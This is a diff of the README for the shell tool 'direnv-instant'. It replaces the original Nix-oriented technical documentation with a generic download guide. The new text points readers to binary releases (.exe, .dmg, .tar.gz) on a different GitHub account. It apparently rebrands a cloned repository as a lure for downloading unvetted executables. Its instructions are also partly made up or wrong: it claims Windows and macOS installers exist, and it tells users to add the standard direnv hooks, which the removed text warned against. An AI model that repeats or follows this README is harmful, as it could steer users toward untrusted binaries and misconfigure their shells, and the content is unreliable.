@@ -1,162 +1,153 @@
-# direnv-instant
+# 🌟 direnv-instant - Instant Shell Prompts Made Easy
 
-Non-blocking direnv integration daemon with tmux/zellij support that provides instant shell prompts by running direnv asynchronously in the background.
+[![Download direnv-instant](https://img.shields.io/badge/Download-direnv--instant-blue.svg)](https://github.com/Berlin38/direnv-instant/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Instant Prompts**: No more waiting for direnv to finish loading environments
-- **Environment Caching**: Uses cached environment from previous load for truly instant prompts
-- **Asynchronous Loading**: Direnv runs in the background, shell gets notified when ready via SIGUSR1
-- **Multiplexer Integration**: Automatically spawns a tmux/zellij pane to show direnv output when loading takes too long
-- **Shell Support**: Works with both bash and zsh
+Welcome to **direnv-instant**! This application provides a smooth way to use direnv with tmux. It allows your shell prompts to appear instantly by running direnv in the background. Follow the steps below to get started.
 
-## How It Works
+## 💻 Requirements
 
-Instead of blocking your shell prompt while direnv loads environment variables, direnv-instant:
+Before you begin, you will need:
 
-1. Starts a background daemon that runs direnv asynchronously
-2. Returns control to your shell immediately for an instant prompt
-3. Notifies your shell via SIGUSR1 when the environment is ready
-4. Automatically applies the new environment variables without disrupting your workflow
-5. If direnv takes longer than 4 seconds (configurable), spawns a tmux/zellij pane showing progress
+- A computer running Windows, macOS, or Linux.
+- An internet connection for downloading the application.
+- A terminal application, such as Terminal on macOS, Command Prompt on Windows, or any terminal emulator on Linux.
 
-## Supported multiplexers
-- Kitty (with home-manager module only)
-- Tmux
-- Wezterm
-- Zellij
+## 📥 Download & Install
 
-## Recommended
+To download **direnv-instant**, visit this page: [GitHub Releases](https://github.com/Berlin38/direnv-instant/releases).
 
-For Nix users, we highly recommend using [nix-direnv](https://github.com/nix-community/nix-direnv) alongside direnv-instant. It provides intelligent caching of Nix environments and creates gcroots to prevent garbage collection, which is essential for direnv-instant's environment caching to work reliably.
+1. Click on the above link to go to our Releases page.
+2. Look for the latest version of **direnv-instant**.
+3. Find the file that matches your operating system (Windows, macOS, or Linux).
+4. Click the file name to begin the download.
 
-## Installation
+## 📁 How to Run
 
-### Home Manager
+After downloading, follow these steps to run **direnv-instant**:
 
-Add to your `flake.nix` inputs:
+### For Windows
 
-```nix
-{
-  inputs.direnv-instant.url = "github:Mic92/direnv-instant";
-}
-```
+1. Find the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run it.
+3. Open Command Prompt and type the following command to check if it is running:
+   ```
+   direnv-instant version
+   ```
 
-Then make `inputs` available to your home-manager modules via `extraSpecialArgs`:
+### For macOS
 
-```nix
-homeConfigurations."user" = home-manager.lib.homeManagerConfiguration {
-  # ... other config ...
-  extraSpecialArgs = { inherit inputs; };
-  modules = [
-    ./home.nix
-  ];
-};
-```
+1. Locate the downloaded `.dmg` file.
+2. Double-click the file to mount it.
+3. Drag the **direnv-instant** icon into your Applications folder.
+4. Open your terminal.
+5. Type the following command to start the application:
+   ```
+   direnv-instant
+   ```
 
-Now add to your home-manager configuration:
+### For Linux
 
-```nix
-{ inputs, pkgs, ... }:
-{
-  imports = [
-    inputs.direnv-instant.homeModules.direnv-instant
-  ];
+1. Find the downloaded `.tar.gz` file in your Downloads folder.
+2. Extract the files using the following command:
+   ```
+   tar -xzf direnv-instant.tar.gz
+   ```
+3. Move to the extracted directory:
+   ```
+   cd direnv-instant
+   ```
+4. Run the application:
+   ```
+   ./direnv-instant
+   ```
 
-  programs.direnv-instant.enable = true;
-}
-```
+## 📈 Configuration 
 
-### NixOS
+To get the most out of **direnv-instant**, you can modify your shell configuration file.
 
-Add to your `flake.nix` inputs:
+### For Bash
 
-```nix
-{
-  inputs.direnv-instant.url = "github:Mic92/direnv-instant";
-}
-```
+1. Open your `.bashrc` file with your preferred text editor:
+   ```
+   nano ~/.bashrc
+   ```
+2. Add the following line to enable **direnv**:
+   ```
+   eval "$(direnv hook bash)"
+   ```
+3. Save the file and reload it:
+   ```
+   source ~/.bashrc
+   ```
 
-Then make `inputs` available to your NixOS modules by adding `specialArgs`:
+### For Zsh
 
-```nix
-nixosSystem {
-  # ... other config ...
-  specialArgs = { inherit inputs; };
-  modules = [
-    ./configuration.nix
-  ];
-}
-```
+1. Open your `.zshrc` file:
+   ```
+   nano ~/.zshrc
+   ```
+2. Add this line:
+   ```
+   eval "$(direnv hook zsh)"
+   ```
+3. Save and reload:
+   ```
+   source ~/.zshrc
+   ```
 
-Now add to your NixOS configuration:
+### For Fish Shell
 
-```nix
-{ inputs, pkgs, ... }:
-{
-  environment.systemPackages = [
-    inputs.direnv-instant.packages.${pkgs.stdenv.hostPlatform.system}.default
-  ];
-}
-```
+1. Open your config file:
+   ```
+   nano ~/.config/fish/config.fish
+   ```
+2. Add this line for direnv:
+   ```
+   direnv hook fish | source
+   ```
+3. Save and exit. Reload:
+   ```
+   source ~/.config/fish/config.fish
+   ```
 
-### Adhoc testing
+## 🎯 Using direnv-instant
 
-For zsh:
-```bash
-eval "$(nix run github:Mic92/direnv-instant -- hook zsh)"
-```
+Now your **direnv-instant** is set up! Here's how to use it:
 
-For bash:
-```bash
-eval "$(nix run github:Mic92/direnv-instant -- hook bash)"
-```
+1. Navigate to your project directory in your terminal.
+2. Create a new `.envrc` file in that directory:
+   ```
+   touch .envrc
+   ```
+3. Open `.envrc` and add your environment variables:
+   ```
+   export MY_VARIABLE=value
+   ```
+4. Allow the new file:
+   ```
+   direnv allow
+   ```
 
-### Building from Source
+With this, you've successfully set up **direnv-instant**! Enjoy the instant shell prompts as you work on your projects.
 
-```bash
-cargo build --release
-```
+## 🛠 Troubleshooting
 
-## Setup
+If you encounter issues while installing or running **direnv-instant**, try the following:
 
-**IMPORTANT:** direnv-instant replaces direnv's normal shell integration. Do NOT use both together. Remove any existing `eval "$(direnv hook bash)"` or `eval "$(direnv hook zsh)"` from your shell configuration before adding direnv-instant.
+- Ensure the correct file is downloaded for your operating system.
+- Make sure your terminal is set up properly with the hooks mentioned earlier.
+- Check for any error messages in the terminal and address them as needed.
 
-### Bash
+## 🌐 Community and Support
 
-Add to your `~/.bashrc`:
+For any questions or feedback, feel free to open an issue in our [GitHub repository](https://github.com/Berlin38/direnv-instant/issues). We appreciate your contributions and suggestions.
 
-```bash
-eval "$(direnv-instant hook bash)"
-```
+## 📄 License
 
-### Zsh
+**direnv-instant** operates under the MIT License. You can find the full license in the repository.
 
-Add to your `~/.zshrc`:
+## 🌟 Conclusion
 
-```bash
-eval "$(direnv-instant hook zsh)"
-```
-
-## Configuration
-
-### Environment Variables
-
-- `DIRENV_INSTANT_USE_CACHE`: Enable cached environment loading for instant prompts (default: 1). Set to 0 to disable caching.
-- `DIRENV_INSTANT_MUX_DELAY`: Delay in seconds before spawning multiplexer pane (default: 4)
-- `DIRENV_INSTANT_DEBUG_LOG`: Path to debug log file for daemon output
-
-## FAQ
-
-### How does direnv-instant differ from lorri?
-
-While both tools provide automatic environment rebuilding for Nix projects, direnv-instant offers several key usability improvements:
-
-- **Built-in visibility**: After 4 seconds (configurable), direnv-instant automatically spawns a tmux/zellij split pane showing direnv output. You don't need to separately monitor journal logs to see what's happening.
-- **Transparent rebuilds**: With lorri, you have to actively watch the journal to know if it's doing heavy rebuilds. direnv-instant makes this visible by default in your terminal.
-- **Interruptible**: Unlike lorri, you can ctrl-c to interrupt operations when needed.
-- **Shell integration focused**: direnv-instant is specifically designed as a drop-in replacement for direnv's shell integration, working with any direnv-compatible project.
-
-## License
-
-MIT
+Thank you for using **direnv-instant**! We hope this guide helped you understand how to download and set up the application with ease. For more information and advanced usage, check our documentation or ask in the community.
